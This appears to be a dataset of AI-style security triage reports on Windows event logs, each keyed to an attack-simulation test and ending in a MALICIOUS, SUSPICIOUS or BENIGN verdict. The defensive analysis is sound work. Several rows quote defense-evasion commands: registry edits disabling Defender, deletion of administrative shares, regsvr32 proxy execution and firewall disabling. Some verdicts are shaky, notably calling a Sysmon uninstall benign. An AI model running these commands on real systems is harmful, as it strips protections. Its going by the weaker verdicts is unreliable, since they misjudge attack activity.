- **Time Adjustment Events (Event ID: 1 and 24)**: These events indicate the system time was adjusted, potentially through `svchost.exe`. While not inherently malicious, frequent or unexpected time adjustments can be a sign of tampering. In this context, it seems to be related to time synchronization activities with `time.windows.com`. Unless there is unexplained time discrepancy, this appears typical and benign.

### Application Logs:

- **Windows Security-SPP Event (Event ID: 16384)**: Logs related to the Software Protection Platform Service may indicate licensing or activation activity. There is nothing unusual about such events, provided they match expected system behavior.

### Sysmon Logs:

- **Process Creation (Event ID: 1)**: Several processes are executed, such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `cmd.exe`, `whoami.exe`, and `reg.exe`. Of particular concern is:
  - **cmd.exe with CommandLine `/c reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fAllowToGetHelp /t REG_DWORD /d 1 /f`**: This command modifies the registry to enable remote assistance. This action is suspicious without prior authorization or proper context, as it could be a sign of unauthorized remote access configuration.

- **Execution of System Utilities**: Utilities such as `wevtutil.exe`, `cmd.exe`, and `reg.exe` being executed by a user `SERVER002\admin_test` could be benign if expected, but their execution together, particularly with registry modification, raises concerns about potential misuse.

### Security Logs:

- **Time Change Events (Event ID: 4616)**: Correspond with the System logs time adjustments. Executed by `svchost.exe`, which serves multiple system purposes. As previously noted, these adjustments are typically benign unless they are not aligned with expected time sync operations.

### Assessment:

The combination of events, especially the use of `cmd.exe` to modify registry settings, suggests potential unauthorized activity. This command, which modifies settings to permit remote assistance, is often associated with enabling unauthorized remote access. The execution of various system utilities around the same time further raises concerns, as it could signify preparation or cover-up actions typically seen in malicious scenarios.

### Conclusion:

Based on the evidence and the potentially unauthorized registry change, the activity in these logs is categorized as **SUSPICIOUS**. There is a need for additional investigation to determine the intent and legitimacy of the processes executed around the same time, primarily focusing on the `cmd.exe` registry modification command.

### Guidance:

1. **Verify User Intent**: Review user activity logs, specifically those of `admin_test`, and verify if these actions were authorized or expected.
2. **Network Activity**: Check for unusual outbound traffic around the time of these logged events.
3. **System Integrity**: Conduct a scan for malware or unauthorized tools on `Server002`.
4. **Surrounding Logs**: Collect and analyze surrounding events, including network connection logs, to gather the full picture context.
5. **Response Action**: Depending on further findings, consider reverting unauthorized changes, such as the registry modification, and enhancing monitoring on this system."
Remove Network Share,"In analyzing the provided logs from the Windows host, I've focused on identifying any suspicious or anomalous behavior that might indicate malicious activity. Here is a detailed analysis:

1. **Security Log:**
   - The security logs show event ID 4616, which indicates a system time change. The time adjustments appear to be brief and could be normal if the system is synchronizing time with a time server (e.g., using NTP). The process involved is `svchost.exe`, which is a legitimate Windows process. There are no signs of privilege escalation or unauthorized account activity.

2. **Windows PowerShell Log:**
   - There are no entries in the provided PowerShell logs, which means the typical PowerShell-based attacks (e.g., script execution) can neither be confirmed nor ruled out.

3. **Application Log:**
   - The application logs primarily show `edgeupdate` activities, where the service stops several times. This could be part of the normal operation of Microsoft Edge updating itself. Additionally, the Software Protection Platform Service (`sppsvc`) logs an entry without any indication of an error or unusual activity.

4. **Sysmon Log:**
   - The Sysmon logs record a sequence of process creations. Here are some notables:
     - There are multiple executions of `wevtutil.exe` and `conhost.exe` by a user named `admin_test`. `wevtutil.exe` is a legitimate utility to query event logs, but frequent invocation might signal log scraping or tampering.
     - The execution of `cmd.exe` with `net share \\test\share /delete` is unusual and indicative of network share alterations. This action could suggest potential cleanup of shares or drive-by attempts to uncover or manipulate network resources.
     - The execution path involving `MicrosoftEdgeUpdate.exe` and related processes is consistent with software updates, hence no direct threat is implied here.
     - The commands such as `hostname.exe` and `whoami.exe` are relatively benign if executed by a trusted user, often used for diagnostic purposes.

5. **System Log:**
   - The system log reiterates the security log with time adjustments, likely a part of time synchronization. No significant deviations were noted.

**Assessment:**
- Considering the logs, while most activities seem benign or part of regular updates, the repeated execution of event log utility (`wevtutil.exe`) and the deletion of a network share using `cmd.exe` are slightly suspicious if not contextually justified. These could suggest reconnaissance or actions taken by a user with potentially malicious intent.

**Resolution:**
Based on the analysis, the findings lean towards:
- **SUSPICIOUS**: While there's no definitive malicious activity, the repeated use of utilities that manipulate system logs and network shares without more context warrants further investigation. It is advisable to:
  - Verify if the account `admin_test` performing these actions was authorized.
  - Determine if there were recent administrative tasks or policies explaining these actions.
  - Review the system for any signs of tampering, especially if similar patterns appear in other logs or if there was unauthorized access.
"
Regsvr32 Registering Non DLL,"Based on the Windows event logs provided, there are multiple entries that suggest potential malicious activities. Let's analyze these findings:

1. **Process Execution and Command-Line Arguments:**
    - The logs show the execution of `cmd.exe` using command-line arguments such as copying a DLL file (`shell32.dll`) to a location with a `.jpg` extension (i.e., `""cmd.exe"" /c copy ""C:\\Windows\\System32\\shell32.dll"" ""%%temp%%\\shell32.jpg""`). This is suspicious as it indicates an obfuscation attempt, possibly trying to masquerade a DLL file as a harmless image file.
    - Execution of `regsvr32.exe` with parameters (`/s %%temp%%\\shell32.jpg`) to potentially execute the renamed file is a known technique often associated with malicious activities such as DLL side-loading or proxy execution.
  
2. **Parent Process and Integrity Levels:**
    - A high integrity level indicates that commands are executed with elevated privileges, which can be used by attackers to perform unauthorized actions.
    - Logs show `cmd.exe` processes originating from `wsmprovhost.exe`, indicating actions being carried within a Windows Management Instrumentation (WMI) provider host, which might be used to execute commands remotely.
  
3. **Other Suspicious Indicators:**
    - Rapid execution of processes (`wevtutil.exe` and `conhost.exe`) that typically interact with event logs may suggest attempts to clear logs to cover tracks.
    - Synchronous execution of `whoami.exe`, potentially to check current user privileges, suggests further probing of system access.

4. **Time Manipulation Indicators:**
    - Event logs related to time being modified through `svchost.exe` suggests potential time stomping. Therefore, this presents concerns about altering timelines to hide malicious activity traces.

The evidence gathered suggests a series of actions aimed at:
- Obfuscating and executing possible malicious payloads.
- Escalating and confirming user privileges.
- Potentially manipulating system logs to hinder auditing efforts.

**Resolution:** MALICIOUS

**Guidance for Proceeding:**
- Immediately isolate the affected host to prevent further unauthorized access or damage.
- Conduct a full forensic investigation to determine the payload's origin and impact.
- Identify any other compromised systems in the network.
- Review system privileges and user access to enforce the principle of least privilege.
- Update malware detection mechanisms and apply necessary patches to mitigate similar vulnerabilities in the future.
- Consider engaging with incident response services to thoroughly assess and contain the threat."
LockBit Black - Unusual Windows firewall registry modification -Powershell,"A detailed analysis of the provided log entries reveals the following:

1. **PowerShell Activity:**
   - The logs indicate the execution of a PowerShell command designed to disable the Windows Firewall on both the domain and standard profiles. This is done using `New-ItemProperty` commands to set `EnableFirewall` to `0`.
   - The command is executed with elevated privileges (as the `SERVER002\admin_test` user in a high integrity level session), indicating it aims to modify system-level settings.
   - The PowerShell activity recorded under the Windows PowerShell log also confirms the execution and stop of the session.
   - The use of PowerShell to directly modify registry settings related to the firewall is suspicious because disabling the firewall could expose the system to external threats.

2. **Sysmon Logs:**
   - Multiple entries log processes such as `wevtutil.exe`, `conhost.exe`, `svchost.exe`, and PowerShell, showing their User ID as `SERVER002\admin_test` and running with high integrity levels. 
   - `wevtutil.exe` is often used for managing Windows event logs, but its use in conjunction with PowerShell commands altering firewall settings could be an indication of malicious intent.
   - The Sysmon log showing PowerShell execution details corroborates the findings in the PowerShell activity logs.

3. **EdgeUpdate Process:**
   - The presence of `MicrosoftEdgeUpdate.exe` processes operating as `NT AUTHORITY\SYSTEM` is standard behavior for updating applications like Microsoft Edge, but given the concurrent suspicious activity, these should be noted for context.

4. **Analysis and Findings:**
   - The significant factor here is the usage of PowerShell scripts to disable vital security mechanisms like the Windows Firewall. This indicates a potential breach as it might be used to introduce or propagate other malicious activities without detection.

5. **Recommendation:**
   - Given the logs:
     - **Resolution: MALICIOUS**
     - This assessment considers the disabling of the Windows Firewall using PowerShell scripts as a direct compromise of the system's security posture.
   - It is advised to immediately:
     - Review user privileges and restrict unauthorized privileges escalation.
     - Conduct a broader threat assessment on the network to ensure no other systems are affected.
     - Examine the source and reproducibility of the PowerShell script or command to trace back to potential unauthorized access.
     - Reenable the Windows Firewall and scrutinize logs for any unauthorized changes or external communications anomalies during the time frame in question.

This analysis suggests that the system is likely compromised or at least being tested for vulnerabilities related to its firewall settings, potentially as part of broader malicious activity."
Take ownership using takeown utility,"During the analysis of the provided Windows event logs, several entries were noteworthy. Below, I outline my findings and conclude with a resolution.

### Analysis:

**1. **Security Logs:***
- The Security log events (EventID 4616) indicate standard time change events which could be normal if these changes align with time synchronization services (e.g., NTP). There is no apparent evidence of malicious time manipulation.

**2. **System Logs:***
- The Kernel-General events surrounding time adjustments may correlate with time synchronization upon system start, pointing to routine system operations.

**3. **Application Logs:***
- The logs from the Edge Update process indicate normal service stop events, which by themselves do not showcase malicious activity.

**4. **Sysmon Logs:***
- Several instances of command line executions (`cmd.exe`, `takeown.exe`, `conhost.exe`) were noted. Specifically, the use of `takeown.exe` to take ownership of files in `%temp%` suggests that there might have been an attempt to alter permissions, which could be suspicious, especially when seen in the context of potential malware behavior or script misuse.
- The use of `wevtutil.exe` is documented, which could relate to manipulation or querying of event logs. Coupled with ownership changes, these can indicate malicious intent, although additional evidence would be required for confirmation.
- Extensive use of `MicrosoftEdgeUpdate.exe` also warrants attention, although these could be legitimate updates if contextually aligned with known update schedules.

**5. **Further Observations:***
- The consistent execution of `MicrosoftEdgeUpdate.exe` and its related processes does not inherently indicate malicious behavior, as long as this is part of an expected software update process.
- Instances of `whoami.exe` usage appear, yet without further context, simply reflect system queries potentially tied to user verification processes.

### Assessment and Conclusion:

Upon parsing through the detailed entries across logs, there is a **suspicion** arising from administrative commands executed (`takeown`, `cmd` operations) which relate to actions that change file ownership and could potentially cloak malicious activity under administrative privileges. However, without more supporting context, it is difficult to conclude with certainty that these actions are malicious.

While more investigation is warranted, particularly around the use of administrative commands and the context of Edge Update processes, there isn't robust evidence of definite malicious compromise present from the logs alone. The behaviors noted are **suspicious,** thus necessitating further inquiry, potentially involving endpoint behavior monitoring or scrutiny of related network traffic to ensure security posture.

### Resolution: **SUSPICIOUS**

Continue with deeper forensic analysis as needed to confirm or dispel any malicious activities, and possibly conduct thorough endpoint monitoring to ensure that similar behaviors are either validated as non-threats or prevented if found otherwise."
Tamper with Windows Defender Registry - Reg.exe,"**Analysis:**

1. **Indicators of Malicious Activity:**

   - **Windows Defender Disabled:**
     - Multiple entries in the Application log indicate that Windows Defender was turned off (`""Windows Defender, SECURITY_PRODUCT_STATE_OFF""`). This is concerning because it suggests an attempt to disable the system's native antivirus tool.
     - Correlating these entries with Sysmon logs, there is suspicious command execution via `cmd.exe` to manipulate registry keys with the intent to disable various Windows Defender protections (e.g., `DisableAntiSpyware`, `DisableBehaviorMonitoring` etc.). This is a strong indicator of malicious activity, as attackers often disable security tools and features to evade detection.

   - **Suspicious Registry Modifications:**
     - The Sysmon logs show a specific `cmd.exe` process executing a series of `reg add` commands to disable Windows Defender features. This includes disabling real-time protection, behavior monitoring, script scanning, and other security functionalities.
     - These actions are characteristic of attempts to make a system more vulnerable and evade antivirus detection.

   - **Time Manipulation:**
     - There are multiple instances recorded in both System and Security logs where system time was modified (`EventID 4616`). While not inherently malicious, unauthorized time changes can be used to circumvent time-based security mechanisms or to obscure the timeline of events for forensic analysis.

2. **Potentially Benign Entries:**

   - Regular system updates and services start/stop actions (`Microsoft Edge Update` related activities and `svchost.exe` process starts) appear consistent with routine system operations. There is no direct linkages to more suspicious activity, and they seem benign in this context.

3. **Assessment of the Situation:**

   - The logs strongly indicate **MALICIOUS** activity due to the systematic attempt to disable Windows Defender's functionalities through registry modifications.
   - System time changes, though suspicious, complement the malicious behavior by possibly attempting to manipulate or confuse event timelines.

4. **Guidance on How to Proceed:**

   - **Immediate Actions:**
     - Re-enable and update Windows Defender and perform a comprehensive system scan to detect any additional threats.
     - Investigate the source of the registry key modifications to identify any responsible scripts, scheduled tasks, or processes.
     - Review user account activity and system access logs to determine if any unauthorized access occurred.

   - **Long-term Actions:**
     - Implement enhanced monitoring for similar activities and privilege changes.
     - Consider deploying more robust endpoint protection solutions and review system hardening practices to prevent future occurrences.
     - Conduct a thorough security audit to identify and patch any potential vulnerabilities that could have been exploited.
"
DLP Evasion via Sensitive Data in VBA Macro over HTTP,"### Detailed Analysis of Provided Windows Event Logs

#### **Security Log Analysis**
1. **Event ID 4616: Time Change**
   - The logs show instances where the system time was altered (EventIDs 30328 and 30329). This is a common indicator of activity meant to obfuscate logs or manipulate system operations and is executed by `svchost.exe`, a legitimate Windows process. However, changes in system time by authorized processes may be part of normal maintenance or system adjustments.

2. **Event ID 5379: Credential Manager Operation**
   - Multiple failed attempts (ReturnCode: 3221226021) to read credentials from the Microsoft Account and Windows Live tokens by the process starting around the same time (EventIDs 30330 to 30336). This suggests a possible attempt to access credential information, which failed. This may hint at an unauthorized access attempt, but the absence of further detail requires contextual investigation.

3. **Event ID 4672: Special Privileges Assigned**
   - User `admin_test` was granted special privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.) (EventID 30338). This indicates elevated rights which, if unexpected, could pose a potential security risk.

4. **Event ID 4624: Successful Logon**
   - A successful logon instance for `admin_test` (EventID 30339) is recorded using NTLM authentication of type 3, which typically indicates a network logon. Combined with special privileges, further scrutiny is warranted.

#### **System Log Analysis**
1. **Time discrepancies** between `OldTime` and `NewTime` are noted (EventRecordIDs 3566, 3569). This confirms the system time changes as seen earlier, which could be benign or a red flag depending on context.

2. **Windows Update Client Activity** (EventRecordIDs 3570, 3571, 3572) shows regular update operations. Updates are part of normal operations if originating from legitimate sources.

#### **PowerShell Log Analysis**
1. **PowerShell Command Execution**
   - A suspicious invocation of PowerShell using `Invoke-WebRequest` to interact with a local URI and involving a file within a temporary directory (EventRecordIDs 1043 to 1049). The use of PowerShell to execute scripts from such directories can be a sign of malicious attempt, particularly if macros or scripts are embedded.

#### **Sysmon Log Analysis**
1. **Process Creation Events**
   - Frequent execution of `whoami.exe` and `conhost.exe` by the user `admin_test` (EventIDs 17917, 17918, 17945, etc.) could suggest enumeration activity, which is notable if performed repetitively or without administrative oversight.
   - Multiple `wevtutil.exe` executions (EventIDs 17923, 17927, 17931, etc.) frequently by `admin_test` suggest intent to interact with event logs, potentially indicative of attempts to clear or manipulate log data.

2. **PowerShell Execution**
   - A PowerShell process is logged executing similar suspicious commands noted in PowerShell logs (EventID 17949), reinforcing concerns about attempted local file interactions and potential malicious use of PowerShell.

3. **Software Installations**
   - Multiple Sysmon logs showing software update installations (EventIDs 17962, 17963, 17964), particularly related to Microsoft Edge. These appear as regular update operations when they align with official update channels.

### Final Assessment

- **SUSPICIOUS**: The logs show a mixture of benign and suspicious activities. While the update events are standard, the irregularities such as system time changes, handling credentials operations, excessive privileges, and suspicious use of PowerShell suggest potentially unauthorized or unintended actions. The sysmon logs, indicating frequent command executions and wevtutil usage needs additional context but raise a flag. Further detailed investigation, especially on the PowerShell activities and user `admin_test` activities around this timeframe, is warranted before making a conclusive assessment.

### Guidance on Proceeding

- **Contextual Review**: Assess the time change logs, scrutinize any recent changes by IT maintenance or scheduled operations.
- **Credential Event Analysis**: Investigate if the credential access attempts by `SERVER002$` were part of a known, secure process.
- **User `admin_test` Review**: Cross-examine the administrative user actions, privilege changes, and network login activities with known tasks or workflows.
- **PowerShell Transcript**: If PowerShell logging is enabled, review transcripts for command details and validate if they match any authorized scripts or actions.
- **Alert Monitoring**: Ensure SIEM or endpoint detection mechanisms are tuned to detect further suspicious PowerShell or network activities on similar parameters identified."
Disable Administrative Share Creation at Startup,"After conducting a thorough review of the provided Windows event logs from the System, Security, Sysmon, and Application channels, here are the findings and analysis:

### Suspicious or Anomalous Behavior:

1. **Time Change Events:**
   - There are repeated Kernel-General (Event ID: 1) time change events where the system's clock is being adjusted backward and forward. This could indicate attempts to obscure activities by altering timestamps.

2. **Elevated Privileges:**
   - Event ID 4672 shows that user `admin_test` logged in with special privileges, including `SeDebugPrivilege`. While it's not inherently malicious, elevated privileges can indicate a potential target for credential theft or misuse if these privileges are used inappropriately.

3. **Registry Modifications:**
   - Observed commands (Sysmon Event ID: 1) executed via `cmd.exe` to modify the registry keys related to `LanmanServer\Parameters`. Disabling AutoShareServer and AutoShareWks is often associated with attempts to hide shares from network discovery, which could suggest malicious activity.

4. **Execution of Wevtutil and Conhost:**
   - Multiple instances of the `wevtutil.exe` and `conhost.exe` by user `SERVER002\admin_test` appear. Although `wevtutil` is a legitimate tool used for managing Windows Event logs, its excessive use could be meant to clear event logs, thereby hiding tracks.

### Potentially Malicious Indicators:
- **Command Line Execution:**
   - The registry modifications to system settings seem relevantly unauthorized for regular operational behavior. Normally, such changes should be authorized and documented, especially those affecting network shares visibility.
   
- **Edge Update Activities:**
   - Multiple entries documenting actions by `MicrosoftEdgeUpdate.exe` are present. Most activity appears normal for an update service, but it is worth verifying to ensure it aligns with expected update times and activity.

### Assessment:
Based on the analysis of these logs, the findings suggest there is likely exploitation or misuse on the system, particularly concerning registry modifications and the use of elevated privileges and potential time manipulation activities. Therefore, the scenario could be classified as:

- **Resolution: SUSPICIOUS**

### Guidance and Next Steps:
1. **Investigate User Activities:**
   - Verify the legitimacy of `admin_test` account activities. Ensure the permissions and logged actions correspond with the user's expected responsibilities.

2. **Review Registry Changes:**
   - Confirm whether the registry changes are permitted according to company security policies or if they were unauthorized.

3. **Time Change Investigation:**
   - Investigate the reasons behind and implications of the repeated time changes on the host.

4. **Monitor and Audit Logs:**
   - Implement tighter monitoring around this server, particularly for user activities and log clearance attempts. Enable additional logging to capture full command lines and process creations (e.g., Sysmon configurations).

5. **Perform Threat Hunt:**
   - Utilize endpoint detection tools to search for IOCs related to this activity and extend the review to other connected systems.

6. **Incident Response:**
   - If further evidence suggests compromise, implement the incident response procedure, which may include isolating the host, resetting credentials, and conducting a forensic investigation."
Windows - Timestomp a File,"Upon analyzing the provided Windows event logs, several indicators of potential malicious activity have been identified, particularly focusing on the usage of PowerShell and the presence of the tool ""timestomp"":

### Summary and Findings:

1. **PowerShell Execution with Timestomp:**
   - Multiple entries in the PowerShell logs indicate the execution of a PowerShell script named `timestomp.ps1`. The command executed is importing a module from a temporary directory and running the `timestomp` command to target a file `kxwn.lock`.
   - **Timestomp** is a tool typically used to manipulate the timestamp of a file, which is often associated with hiding unauthorized changes or malware deployment. This is a strong indication of potential malicious activity aimed at evading detection.

2. **Sysmon Log Analysis:**
   - There are numerous Sysmon logs showing the execution of PowerShell and other system utilities like `wevtutil.exe` and `conhost.exe` under the user account `admin_test`.
   - The timestamps across these logs correlate with the PowerShell script execution, which reinforces the suspicion that these activities are coordinated as part of a malicious campaign.

3. **Application and EdgeUpdate Events:**
   - The Application log entries show standard activity related to Microsoft Edge Update. While they overlap timewise with the potentially malicious PowerShell executions, these entries appear benign and part of regular update processes. However, it's worth noting the overlap in context-sensitive analysis, but the primary concern remains with the custom PowerShell and timestomp activity.

4. **Absence of Security Log Entries:**
   - No entries in the Security logs further complicate direct user activity tracking. In a more secured environment, logs from the Security channel could help correlate suspicious activity with potential unauthorized access attempts.

### Assessment and Guidance:
- **Resolution: MALICIOUS**
   - Given the presence of the `timestomp.ps1` script execution, it's clear there's an attempt to manipulate file timestamps, a common tactic to hide traces of unauthorized actions.
   - The repeated execution of PowerShell from a temporary directory to import a potentially malicious script further solidifies this assessment.

### Recommended Actions:
1. **Immediate Containment:**
   - Isolate Server002 to prevent potential lateral movement within the network.
   - Review and, if necessary, disable the affected user account `admin_test` pending further investigation.

2. **In-depth Analysis:**
   - Retrieve and analyze the `timestomp.ps1` script and related files. Determine the full extent of any modifications or payloads executed.
   - Cross-reference the usage of `timestomp.ps1` on other hosts in the environment to identify further compromise.

3. **Incident Response:**
   - Engage the incident response team to conduct a thorough investigation.
   - Examine recent changes, permissions, and installed software that could have been part of an attack leveraging this technique.

4. **Remediation and Reporting:**
   - Strengthen detection and prevention measures including more robust PowerShell logging and endpoint protection policies.
   - Report the incident to impacted stakeholders and potentially consider notifying relevant authorities if applicable.

By addressing the outlined issues and following the recommended response plan, the organization can mitigate the threat and work towards securing the affected systems."
Invoke CHM Shortcut Command with ITS and Help Topic,"## Detailed Log Analysis:

### Key Findings:
1. **Sysmon Logs:**
   - Numerous instances of `powershell.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test`. 
   - Particularly noteworthy is the invocation of PowerShell with a suspicious command: `Invoke-ATHCompiledHelp -ExecuteShortcutCommand ...`. The command structure suggests potential obfuscation or execution of unintended scripts, which is commonly associated with malicious activity.
   - Wevtutil (Windows Events Utility) was run multiple times, although this is not inherently malicious, it can be used to clear event logs which is a common tactic used to hide malicious activity.

2. **PowerShell Logs:**
   - `powershell.exe` started with a command indicating the use of `Invoke-ATHCompiledHelp`. This command is not typical and might be a part of a script or module that is not commonly found in standard PowerShell activity, suggesting potential malicious behavior.
   - The execution of PowerShell commands is often used in various types of attacks, including fileless malware attacks, due to its powerful scripting capabilities.

3. **Security Logs:**
   - There are multiple entries with Event ID 5379 indicating Credential Manager credential read operations. The return code `3221226021` suggests a failure, which may indicate attempted, but unsuccessful, operations to access stored credentials.
   - A successful logon event (Event ID 4624) indicates a logon of type 5 (service startup), which is typical, but needs to be correlated to ongoing activity to ensure it wasn't used in an attack.

4. **Windows Update Logs:**
   - The occurrence of update events, which in isolation are benign as they indicate system and application updates.

### Assessment of Risk:
There are several indicators of potentially suspicious activity present in the logs:
- **Use of PowerShell Scripts:** The unusual PowerShell command is a red flag. This command might be part of a script trying to execute or communicate stealthily.
- **Frequent Use of Wevtutil:** While it could be legitimate, frequent use during the same timeframe as suspicious PowerShell activity could suggest attempts to cover tracks.
- **Credential Manager Access Attempts:** The unsuccessful read attempts from the Credential Manager may suggest probing activity to extract passwords or credentials.

### Conclusion:
After analyzing the provided logs, the activity resembles common techniques used in fileless malware or PowerShell-based attacks due to the suspicious command sequences and frequent execution of PowerShell tasks.

**Resolution: SUSPICIOUS**
- **Actionable Guidance:**
  1. **Immediate Investigation:** Conduct a deeper investigation into the execution context of the PowerShell scripts, specifically any scripts related to `Invoke-ATHCompiledHelp`.
  2. **Endpoint Security Measures:** Use endpoint detection tools to check for a presence of known malware signatures associated with the suspicious PowerShell activities.
  3. **Audit and Contain:** Review access logs, verify installed PowerShell modules, and audit all systems for unauthorized changes or new software installations during this period.
  4. **Credential Changes:** Promptly change all potentially accessed credentials and consider additional monitoring on user `admin_test` for anomalous behavior. 

### Note:
A definitive assessment of ""MALICIOUS"" is not made due to the absence of clear payload delivery or exfiltration evidence, but the suspicious indicators justify further investigation."
Uninstall Sysmon,"### Analysis of Windows Event Logs

#### Application Log:
1. **edgeupdate Events**:
   - Multiple entries indicate that a service related to ""edgeupdate"" has stopped (`EventRecordID`: 2382, 2384). Stopping a service could be benign or anomalous, depending on the context and frequency. In this case, it appears to be a normal service operation.
   
2. **Microsoft-Windows-Security-SPP**:
   - An entry with `EventID` 16384 from the Software Protection Platform Service. This event typically logs information about licensing and protection services updates, which is common and not inherently suspicious.

#### System Log:
1. **Microsoft-Windows-FilterManager**:
   - The event log with `EventID` 1 related to the ""FilterManager"" indicates a successful operation (`FinalStatus: 0x0`). It mentions ""SysmonDrv,"" which is often referenced by the Sysinternals Sysmon tool. If Sysmon is intentionally installed, this is benign; however, unauthorized installation could indicate adversary activity. In this context, there's no indication of being unauthorized.

#### Windows PowerShell and Security Logs:
- These sections are missing (indicated by ""﻿""), hence there is no information available for analysis. Typically, anomalous or malicious activity such as execution of unauthorized scripts or changes in security settings would be highlighted in these logs.

### Assessment

- **Benign Service Events**: The edgeupdate service stopping is likely a routine task. It doesn't utilize any abnormal features or patterns associated with common threats.
  
- **Software Protection Platform Event**: This entry reflects typical licensing checks and operations associated with Microsoft services. No signs suggest malicious activity.

- **FilterManager Event with Sysmon**: The use of ""SysmonDrv"" suggests the presence of Sysmon, commonly used for monitoring and logging purposes, and does not seem unauthorized or unusually conspicuous here.

### Recommendations

- **Review Sysmon Configuration**: If Sysmon is used, ensure it is properly configured to catch any process creation or network connection anomalies.
  
- **Monitor Further Edgeupdate Stopping**: Continue monitoring for patterns, such as repeated crashes or stops, which might indicate issues.

### Conclusion
Based on the available logs, there are no obvious indicators of compromise, malicious activity, or threat indications within the system. The activities logged appear to be standard and expected for system operations.

**Resolution: BENIGN** - The logs provided contain benign activity with no signs of compromise or malicious intent."
Tamper with Windows Defender ATP PowerShell,"After reviewing the provided Windows event logs, several indicators of potentially malicious activity have been observed:

1. **PowerShell Logs:**
   - The PowerShell commands executed on `Server002` are highly suspicious. Disabling multiple security features of Windows Defender using the command `Set-MpPreference -DisableRealtimeMonitoring 1`, along with other parameters to disable behavior and script scanning, immediately stands out. This is a common tactic used by attackers to evade detection and to disable security monitoring and protection.
  
2. **Application Logs:**
   - These logs show multiple instances where Windows Defender was set to a ""SECURITY_PRODUCT_STATE_SNOOZED"" state. This corresponds with the PowerShell commands noted above and further suggests security controls were deliberately disabled, likely as part of malicious activity aiming to prevent detection.

3. **Sysmon Logs:**
   - The execution of `wevtutil.exe` and `conhost.exe` by an administrative user `admin_test` might appear normal, as these are legitimate Windows binaries. However, their execution in quick succession without any known context, especially around the time the security settings were altered, is suspicious. These actions could be related to log tampering or system reconnaissance.

4. **Security Logs:**
   - The adjustments of system time on the machine (indicated by Event ID 4616) can imply an attempt to disrupt log time-stamping or to align timestamps with external schedule events, potentially for stealth purposes.

5. **System Logs:**
   - Correspond to the time changes recorded in the security logs, reinforcing the suspicion of manipulation of system time.

Based on the suspicious PowerShell activity aimed at disabling security features, the state changes of Windows Defender, and potential log tampering or reconnaissance activities (with Sysmon and Security Logs), all signs indicate a high likelihood of malicious activity.

**Resolution: MALICIOUS**

**Guidance:**
- Immediately initiate a full internal investigation and perform a threat-hunting operation across the network to determine the entry vector and scope of the compromise.
- Isolate `Server002` from the network for further forensic analysis to prevent further damage or information leak.
- Review access logs to understand any unauthorized access or exfiltration.
- Conduct a thorough review and hardening of PowerShell usage policies and Windows Defender's configurations across the network.
- Ensure system time and logging configurations are secured and monitored to prevent further tampering.
- Consider instituting an endpoint detection and response (EDR) solution for proactive threat monitoring and behavior analysis."
Remove Administrative Shares,"Upon reviewing the provided log entries, several observations can be made:

1. **Time Synchronization Events**: 
   - The events from the `System` and `Security` logs show that the system time was adjusted twice by the process `svchost.exe`. Such time change events are generally benign and related to time synchronization services like Windows Time Service (W32Time), where `svchost.exe` hosts this service.
   - There were no discrepancies or unusual process behavior associated with these time changes.

2. **Sysmon Log Events**:
   - The `Sysmon` logs show multiple executions of system utilities such as `whoami.exe`, `hostname.exe`, and `cmd.exe`. While the use of such commands isn't inherently malicious, their usage patterns, especially with commands like `cmd.exe /c for %%i in (C$ IPC$ ADMIN$) do net share %%i /delete`, could flag potential unauthorized actions.
   - The command executed by `cmd.exe` aims to remove administrative shares (C$, IPC$, and ADMIN$), which can be suspicious because it can disrupt remote administration or file sharing services. This behavior is more common in attempts to hide tracks or disrupt monitoring.
   - The execution sequence shows the user `SERVER002\admin_test` performing these actions under a high integrity context. This user has invoked these commands multiple times in short succession.

3. **Process Execution**:
   - The spawning of `conhost.exe` by utilities like `whoami.exe`, and `net.exe` is standard as these are console applications.
   - The paths of executable files are consistent with well-known system utilities, minimizing concerns of renamed malicious entities.

4. **General Analysis**:
   - There are no direct indications of privilege escalation attempts or unusual command-line arguments indicating process injection or similar attacks within the logs.
   - The most critical finding lies in the sequence of commands issued to delete network shares, which stands out as behavior requiring further exploration.

**Assessment**: Based on the current evidence, the log activities could indicate suspicious behavior, especially due to the net share deletions. However, without additional context (e.g., justification from user or corroborating evidence from other security tools and alerts), it can’t be definitively classified as malicious.

**Resolution**: **SUSPICIOUS**

**Guidance**:
- Conduct a follow-up investigation with the user `admin_test` to understand the intent behind removing administrative shares.
- Review access control and privilege allocation for the `admin_test` account to ensure that it follows the principle of least privilege.
- Monitor for any continuation or recurrence of these command executions.
- Consider collecting network and system logs from surrounding time periods to verify any unauthorized access or further suspicious activity."
RDP Authentication Level Override,"Upon analyzing the provided log entries, here are the findings:

1. **Sysmon Logs**:
   - The frequent invocation of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` is observed. `wevtutil.exe` is a legitimate utility used to manage event logs. Although its presence is normal, its frequent and automated usage may require further scrutiny, especially if used in conjunction with `conhost.exe`.
   - The use of `cmd.exe` with the command to modify registry keys: `reg add ""HKCU\Software\Microsoft\Terminal Server Client"" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f` is notable. This operation is typically associated with changes in remote desktop settings, potentially to lower security measures, and might indicate an attempt to bypass RDP security settings.
   - Execution of `whoami.exe` and `hostname.exe` could suggest recon attempts to gather system or network info.
   - The occurrence of `wsmprovhost.exe` hosting several scripts or commands might indicate usage of Windows Remote Management, which in some contexts, can be leveraged for remote command execution.

2. **System Logs**:
   - Time change events are noted, where the system time was adjusted and logged by `svchost.exe`. While time synchronization adjustments are routine, unexpected changes without an apparent reason may sometimes be indicators linked to disruptive activities or attempts to obfuscate traces.

3. **Security Logs**:
   - EventID 4672 denotes that the account `admin_test` logged in with elevated privileges, which is usual for admins but should be concisely monitored if correlated with the unusual events.
   - EventID 4624 shows a successful login for `admin_test` from a remote system `DESKTOP-3HL5B2P` using NTLM authentication. It's critical to assess whether this access was expected and approved, especially around the time when registry modifications were made.

4. **Application Logs**:
   - Edge update stopped events recorded in the Application log appear to align with auto-update processes from Microsoft Edge, which is generally benign.

### Assessment:
The actions involve elevated privileges and registry manipulations, which signify potential security risks if these actions are unauthorized. The commands executed and processes observed are consistent with both administrative tasks and certain tactics that could be used for malicious activities, such as persistence or privilege escalation.

### Conclusion:
- **Resolution**: SUSPICIOUS

### Guidance:
1. **Verify Authorization**: Check if the account `admin_test` was authorized for the changes observed in the logs, including registry modifications and system time adjustments.
2. **Investigate Registry Modifications**: Determine the justification for the registry changes affecting RDP settings.
